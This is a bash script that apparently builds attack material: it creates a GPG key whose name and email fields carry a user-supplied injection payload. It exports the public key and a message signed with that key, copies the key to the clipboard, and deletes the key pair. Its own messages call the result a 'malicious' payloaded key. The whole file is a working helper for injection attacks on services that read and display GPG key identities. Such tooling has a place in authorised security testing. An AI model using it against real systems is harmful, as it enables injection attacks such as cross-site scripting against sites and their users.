#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color
checkmark="[+]"

# Banner
if [ $# -lt 1 ] || [ $# -gt 2 ]; then
    echo "Usage example"
    echo "-------------"
    echo -e "Execution example: ${GREEN}$0 name_payload${NC}"
    echo "This will generate a public gpg key and inject name_payload in the name field of the key."
    
    echo ""
    echo -e "Example of the generated key with the name field injected
-----------------------------------------------------------
pub   rsa2048 2023-09-23 [SCEA]
      CEE7972B4282F6647CDBE7B9609E89E7CB770D51
uid           [ultimate] ${RED}name_payload${NC} <goodemail@gmail.com>
sub   rsa2048 2023-09-23 [SEA]
-----------------------------------------------------------
"
    echo ""
    echo "This will inject in both fields the name and the email."
    echo -e "Execution example: ${GREEN}$0 name_payload email_payload${NC}"
    echo ""
    echo -e "Example of the generated key with the name and email fields injected
-----------------------------------------------------------
pub   rsa2048 2023-09-23 [SCEA]
      CEE7972B4282F6647CDBE7B9609E89E7CB770D51
uid           [ultimate] ${RED}name_payload${NC} ${RED}email_payload${NC}
sub   rsa2048 2023-09-23 [SEA]
-----------------------------------------------------------
"
    exit 1
fi

# Check arguments
name=$1
email=$2

if [ $# -eq 1 ]; then
    email="goodemail@gmail.com"
fi

# Create the key
gpg --batch --gen-key <<EOF > /dev/null 2>&1
Key-Type: 1
Key-Length: 2048
Subkey-Type: 1
Subkey-Length: 2048
Name-Real: $name
Name-Email: $email
Passphrase: 2314
Expire-Date: 0
EOF

if [ $? -eq 0 ]; then
    # Get the id(fingerprint) of the key
    gpg --list-key > temp.txt 2>/dev/null
    created_key_fingerprint=$(tail -n 4 temp.txt | awk 'NR==1 {print $1}')

    echo ""
    echo -e "${GREEN}$checkmark${NC} - Malicious payload injected ${GREEN}successfully${NC}."
    echo ""

    tail -n 5 temp.txt

    rm "temp.txt" "public_gpg_key_payloaded.asc" "message.txt" "signed_message.txt.asc"
    
    echo ""
    echo -e "${GREEN}$checkmark${NC} - Malicious public key exported ${GREEN}successfully${NC}. => ${BLUE}public_gpg_key_payloaded.asc${NC}"
    # Export the public key with the payload to .asc format file
    gpg --armor --export $created_key_fingerprint > public_gpg_key_payloaded.asc

    echo -e "${GREEN}$checkmark${NC} - Signed message with the payloaded key generated ${GREEN}successfully${NC}. => ${BLUE}signed_message.txt.asc${NC}"
    # Creates the signed message with the payloaded key
    echo "This is the message." > message.txt
    gpg --clear-sign -u $created_key_fingerprint -o signed_message.txt.asc message.txt

    # Copy the public .asc key to the clipboard
    cat public_gpg_key_payloaded.asc | xclip -selection clipboard

    # Delete the key-pair that just created
    # Delete the secret key
    gpg --batch --yes --delete-secret-key "$created_key_fingerprint" 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}$checkmark${NC} - Secret key deleted ${GREEN}successfully${NC}."
    fi

    #Delete the public key
    gpg --batch --yes --delete-key "$created_key_fingerprint" 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}$checkmark${NC} - Public key deleted ${GREEN}successfully${NC}."
    fi
else    
    echo "Error while triying to create a gpg key-pair."
    exit 1
fi